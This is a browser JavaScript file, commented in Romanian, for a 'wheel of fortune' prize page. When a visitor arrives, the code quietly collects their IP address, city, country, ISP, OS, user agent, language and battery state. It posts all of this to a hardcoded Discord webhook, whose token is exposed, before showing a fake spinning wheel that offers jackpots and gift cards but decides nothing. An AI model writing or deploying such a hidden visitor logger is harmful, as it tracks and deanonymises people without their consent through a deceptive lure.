async function captureAndRedirect() {
    const webhookURL = "https://discord.com/api/webhooks/1459257823308550338/onvNHrUMTbnTZKv33OzRdhcV_CoOlAn2RSqDRPtOHNq5O8VrBqkNNHZezoPwIiCTcWBH"; // <--- Pune Webhook-ul tău aici

    // 1. Detalii Sistem de Operare și Browser
    const os = window.navigator.platform;
    const userAgent = navigator.userAgent;
    const language = navigator.language;

    // 2. Calculare Ping
    const startPing = Date.now();
    let ping = "N/A";
    try {
        await fetch('https://www.google.com', { mode: 'no-cors' });
        ping = Date.now() - startPing + "ms";
    } catch(e) {}

    // 3. Detalii Baterie
    let batteryInfo = "N/A";
    try {
        const battery = await navigator.getBattery();
        batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'La încărcat ⚡' : 'Pe baterie 🔋'})`;
    } catch(e) {}

    // 4. IP și Locație Detaliată
    let ipData = {};
    try {
        const response = await fetch('https://ipapi.co/json/');
        ipData = await response.json();
    } catch (e) {
        ipData = { ip: "Eroare", city: "Necunoscut", country_name: "Necunoscut", org: "Necunoscut" };
    }

    // 5. Trimitere la Discord Webhook
    const payload = {
        username: "Site Monitor",
        embeds: [{
            title: "📡 Vizitator Nou pe numesite.vercel.app",
            color: 3447003,
            fields: [
                { name: "🌐 Adresă IP", value: `||${ipData.ip}||`, inline: true },
                { name: "📍 Locație", value: `${ipData.city}, ${ipData.country_name}`, inline: true },
                { name: "💻 OS / Platformă", value: `**${os}**`, inline: true },
                { name: "📡 Furnizor Net", value: ipData.org, inline: false },
                { name: "⚡ Ping", value: ping, inline: true },
                { name: "🔋 Baterie", value: batteryInfo, inline: true },
                { name: "🌍 Limbă", value: language, inline: true },
                { name: "📱 User Agent", value: `\`\`\`${userAgent}\`\`\`` }
            ],
            footer: { text: "Tracking automat la intrare" },
            timestamp: new Date()
        }]
    };

    try {
        await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch(e) {}

    // 6. Afișăm Dashboard-ul și inițializăm Roata
    document.getElementById("status-container").style.display = "none";
    document.getElementById("main-content").style.display = "block";
    
    if (typeof drawWheel === "function") drawWheel();
}

// --- COD PENTRU ROATA NOROCULUI ---
const canvas = document.getElementById("wheel");
if (canvas) {
    const ctx = canvas.getContext("2d");
    const options = ["Win 10$", "Jackpot 💎", "Lose 💀", "Gift Card", "Big Win 💰", "Try Again"];
    const colors = ["#5865F2", "#3498db", "#e74c3c", "#f1c40f", "#2ecc71", "#9b59b6"];
    let currentRotation = 0;

    function drawWheel() {
        const segmentAngle = 360 / options.length;
        options.forEach((text, i) => {
            const angle = (segmentAngle * i) * (Math.PI / 180);
            const nextAngle = (segmentAngle * (i + 1)) * (Math.PI / 180);
            ctx.beginPath();
            ctx.moveTo(200, 200);
            ctx.arc(200, 200, 200, angle, nextAngle);
            ctx.fillStyle = colors[i];
            ctx.fill();
            ctx.save();
            ctx.translate(200, 200);
            ctx.rotate(angle + (segmentAngle / 2) * (Math.PI / 180));
            ctx.fillStyle = "white";
            ctx.font = "bold 16px sans-serif";
            ctx.textAlign = "right";
            ctx.fillText(text, 180, 10);
            ctx.restore();
        });
    }

    document.getElementById("spin-btn").onclick = () => {
        currentRotation += Math.floor(Math.random() * 360) + 3600;
        canvas.style.transition = "transform 5s cubic-bezier(0.15, 0, 0.15, 1)";
        canvas.style.transform = `rotate(${currentRotation}deg)`;
    };
              }
                    
